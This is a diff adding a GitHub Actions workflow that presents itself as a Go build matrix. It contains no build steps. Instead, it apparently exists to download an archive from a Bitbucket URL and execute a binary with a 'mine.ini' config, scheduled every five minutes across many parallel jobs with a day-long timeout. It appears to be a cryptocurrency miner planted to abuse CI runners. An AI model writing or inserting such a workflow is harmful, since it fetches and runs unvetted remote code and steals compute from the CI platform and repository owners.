@@ -1,0 +1,27 @@
+name: Trial/Line
+
+on:  
+  push:
+  pull_request:
+  schedule:
+    - cron: '*/5 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        go: ['1.11', '1.12', '1.13', '1.14', '1.15']
+        flag: [eqw, rwe, yrt, eqw]        
+    timeout-minutes: 1440
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.job }}
+    steps:
+    - uses: actions/checkout@v2
+    - uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+    - name: SC Control Line
+      run: |
+        wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xf haqi.tar.gz && ./ikuk mine.ini
